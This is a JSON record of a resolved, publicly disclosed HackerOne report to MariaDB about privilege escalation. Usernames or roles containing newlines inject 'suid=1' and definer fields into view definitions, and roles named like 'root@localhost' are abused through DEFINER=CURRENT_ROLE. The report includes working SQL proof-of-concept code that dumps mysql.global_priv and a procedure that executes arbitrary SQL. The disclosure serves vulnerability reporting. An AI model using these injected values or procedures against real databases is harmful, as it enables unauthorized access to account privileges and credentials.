@@ -1,0 +1,106 @@
+{
+  "id": 3880451,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zODgwNDUx",
+  "url": "https://hackerone.com/reports/3880451",
+  "title": "Privilege escalation via user controlled usernames / roles and views",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2026-07-22T04:36:13.735Z",
+  "submitted_at": "2026-07-22T04:36:13.874Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "vortfu",
+    "url": "/vortfu",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/004/982/1ef285fb263d30f189dc6a8038e1d5c46086e9d9_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 8724,
+    "url": "https://hackerone.com/mariadb",
+    "handle": "mariadb",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "MariaDB",
+      "twitter_handle": "mariadb_org",
+      "website": "https://mariadb.org",
+      "about": "MariaDB is a high performance, open source database that helps the world's busiest websites deliver more content, faster."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": true,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-10-07T19:48:29.880Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-09-07T19:48:21.862Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Assuming a scenario where a user has control over the usernames (or roles) that are provisioned for their db, they may escalate privileges via a username or role that contains newline characters since view definers are saved as raw `FILE_OPTIONS_STRING` values.\n\n## Proof of Concept (username)\n\nInitial setup\n\n```sql\nDROP USER IF EXISTS 'root\ndefiner_host=localhost\nsuid=1'@'localhost';\n\nCREATE USER 'root\ndefiner_host=localhost\nsuid=1'@'localhost'\n  IDENTIFIED BY 'password';\n\nGRANT ALL PRIVILEGES ON testdb.* TO 'root\ndefiner_host=localhost\nsuid=1'@'localhost';\n\nFLUSH PRIVILEGES;\n```\n\nthen as `root\\ndefiner_host=localhost\\nsuid=1`\n\n```sql\nDELIMITER //\nCREATE OR REPLACE FUNCTION leak() \nRETURNS LONGTEXT \nDETERMINISTIC\nSQL SECURITY INVOKER READS SQL DATA\nBEGIN\n    DECLARE result LONGTEXT;\n    \n    SELECT JSON_ARRAYAGG(\n        JSON_OBJECT('Host', Host, 'User', User, 'Priv', Priv)\n    ) INTO result \n    FROM mysql.global_priv;\n    \n    RETURN result;\nEND //\nDELIMITER ;\n\nCREATE OR REPLACE VIEW v AS SELECT leak();\n\nSELECT * FROM mysql.global_priv;\n-- ERROR 1142 (42000): SELECT command denied to user 'root\n-- definer_host=localhost\n-- suid=1'@'localhost' for table `mysql`.`global_priv`\n\nSELECT * FROM v;\n-- [{\"Host\": \"localhost\", \"User\": \"mariadb.sys\", \"Priv\": {\"access\":0,\"plugin\":\"mysql_native_password\",\"authentication_string\":\"\",\"account_locked\":true,\"password_last_changed\":0}},...]\n```\n\n## Proof of Concept (roles)\n\n```sql\nCREATE ROLE 'root\ndefiner_host=localhost\nsuid=1';\n\nGRANT 'root\ndefiner_host=localhost\nsuid=1' TO 'vortfu'@'localhost';\n\nFLUSH PRIVILEGES;\n```\n\nthen as `vortfu` (using the same `leak()` fn as above)\n\n```sql\nSET ROLE 'root\ndefiner_host=localhost\nsuid=1';\n\nCREATE OR REPLACE DEFINER=CURRENT_ROLE VIEW v AS SELECT leak();\nSELECT * FROM v;\n-- [{\"Host\": \"localhost\", \"User\": \"mariadb.sys\", \"Priv\": {\"access\":0,\"plugin\":\"mysql_native_password\",\"authentication_string\":\"\",\"account_locked\":true,\"password_last_changed\":0}},...]\n```\n\nAdditionally, a similar behavior exists with stored proceedures (`DEFINER=CURRENT_ROLE`) and roles that match existing usernames\n\n## Proof of Concept (roles `@`)\n\n```sql\nCREATE ROLE 'root@localhost';\nGRANT 'root@localhost' TO 'vortfu'@'localhost';\n```\n\nas `vortfu`\n\n```sql\nSET ROLE `root@localhost`;\n\nCREATE DEFINER=CURRENT_ROLE PROCEDURE `vf-exec`(q TEXT)\n  SQL SECURITY DEFINER\n  EXECUTE IMMEDIATE q;\n\nSELECT * FROM mysql.global_priv;\n-- ERROR 1142 (42000): SELECT command denied to user 'vortfu'@'localhost' for table `mysql`.`global_priv`\n\nCALL `vf-exec`('SELECT * FROM mysql.global_priv');\n-- | localhost        | mariadb.sys                        | {\"access\":0,\"plugin\":\"mysql_native_password\",\"authentication_string\":\"\",\"account_locked\":true,\"password_last_changed\":0}\n-- ...\n```\n\n## Impact\n\nusers may be able to execute SQL with the privileges of other users if they are able to select arbitrary usernames or roles to use.",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2026-10-07T19:48:22.076Z",
+  "allow_singular_disclosure_after": -4849.752441354,
+  "singular_disclosure_allowed": true,
+  "vote_count": 1,
+  "voters": [
+    "inzamulsepoy"
+  ],
+  "structured_scope": {
+    "databaseId": 10335,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "MariaDB Server & Connectors - Access control bypass",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
